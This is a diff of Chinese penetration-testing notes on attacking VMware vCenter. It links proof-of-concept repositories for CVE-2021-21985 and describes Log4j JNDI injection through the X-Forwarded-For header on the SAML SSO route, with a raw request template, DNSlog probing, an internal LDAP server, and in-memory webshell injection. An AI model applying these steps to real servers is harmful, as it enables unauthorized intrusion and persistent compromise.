@@ -437,12 +437,12 @@ https://github.com/r0ckysec/CVE-2021-21985
 具体原理：
 利用ClassPathXmlApplicationContext类加载xml文件触发spel注入，weblogic和jackson都有关于这个类的cve，利用方式都差不多。
 https://github.com/alt3kx/CVE-2021-21985_PoC?tab=readme-ov-file
-四、CVE-2021-44228 Log4j
+
+五、CVE-2021-44228 Log4j
 xff header jndi注入内存马
 漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面。
 
-目录攻击url: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
-x-forwarded-for:{jndi}
+```
 GET/websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
 Host: 192.168.121.137
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
@@ -458,4 +458,5 @@ Sec-Fetch-Site: none
 Sec-Fetch-User: ?1
 Te: trailers
 Connection: close
+```
 DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。  直接注入内存马
